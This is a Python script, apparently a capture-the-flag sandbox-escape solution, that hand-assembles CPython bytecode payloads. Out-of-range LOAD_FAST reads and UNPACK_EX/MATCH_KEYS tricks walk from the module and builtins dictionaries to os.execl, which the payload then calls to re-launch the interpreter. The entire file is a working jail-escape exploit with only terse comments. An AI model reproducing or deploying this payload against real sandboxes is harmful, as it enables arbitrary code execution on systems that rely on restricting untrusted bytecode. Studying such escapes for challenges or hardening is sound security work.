import dis

def assemble(ops):
    ret = b""
    for op, arg in ops:
        if isinstance(op, int):
            opc = op
        else:
            opc = dis.opmap[op]
        ret += bytes([opc, arg])
    return ret

def pop(cnt, tmp_val=126):
    return [("STORE_FAST", tmp_val)] * cnt

def dupl(n, v):
    return [v]*n

def bigdupl(n, *v):
    return v*n

for i in range(32, 127):
    code = assemble([

        *bigdupl(30, ("LOAD_FAST", 69)),
        ("SWAP", 50),
        ("STORE_FAST", 99),  # main module __dict__ at 99

        ("LOAD_FAST", 60),
        ("STORE_FAST", 98),  # builtins __dict__ at 98
        ("LOAD_FAST", 98),
        ("UNPACK_EX", 40),
        *pop(8),

        *bigdupl(32,
            ("STORE_FAST", 97),  # store name at 97
            ("LOAD_FAST", 95),  #"usercustomize"
            ("LOAD_FAST", 99),
            ("LOAD_FAST", 97),
            ("STORE_SUBSCR", 99),
            (33, 33), # "cache" (can be literally any 2 bytes lol)
        ),
        *pop(1),

        ("LOAD_FAST", 99),
        ("LOAD_FAST", 99),
        ("UNPACK_EX", 44),
        ("BUILD_TUPLE", 44),
        ("STORE_FAST", 96),
        *pop(1),
        ("LOAD_FAST", 96),
        ("MATCH_KEYS", 44),

        ("UNPACK_EX", 44),
        *pop(34),
        ("STORE_FAST", 100),  # save os dict at 100

        ("LOAD_FAST", 100),
        ("UNPACK_EX", 40),
        ("BUILD_TUPLE", 40),
        ("STORE_FAST", 102),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 40),
        *pop(40),

        ("UNPACK_EX", 46),
        ("BUILD_TUPLE", 46),
        ("STORE_FAST", 101),
        ("LOAD_FAST", 100),
        ("LOAD_FAST", 101),
        ("MATCH_KEYS", 99),
        ("STORE_FAST", 103),  # store tuple with execl fn and python3 path

        ("LOAD_FAST", 100),
        ("LOAD_FAST", 102),
        ("MATCH_KEYS", 100),
        ("UNPACK_EX", 40),
        *pop(38),
        ("STORE_FAST", 104),  # doc string
        ("LOAD_FAST", 104),
        ("UNPACK_EX", 40),
        *pop(40),
        ("UNPACK_EX", 41),
        *pop(40),
        ("STORE_FAST", 105),  # "-"
        *pop(1),
        ("LOAD_FAST", 103),
        ("UNPACK_EX", 40),
        *pop(20),
        ("STORE_FAST", 106),
        *pop(12),
        ("STORE_FAST", 107),  # execl

        ("LOAD_FAST", 107),

        ("LOAD_FAST", 99),
        ("UNPACK_EX", 42),
        *pop(10),
        ("BUILD_TUPLE", 32),
        ("STORE_FAST", 108),
        *pop(1),
        ("LOAD_FAST", 99),
        ("LOAD_FAST", 108),
        ("MATCH_KEYS", 32),
        ("UNPACK_EX", 32),
        *pop(31),
        ("STORE_FAST", 110),  
        ("LOAD_FAST", 107), # execl
        ("LOAD_FAST", 110), # our first input
        *bigdupl(32, ("LOAD_FAST", 105)), # load "-" 32 times
        
        (47, 32), # CALL_NO_KW_STR_1 with 32 args :skull:
        (32, 32), (32, 32), (32, 32), # needs 3 caches after it (theyre unused so idk why its needed, but wtv)

        ("RETURN_VALUE", 32),

    ])

    print(code)
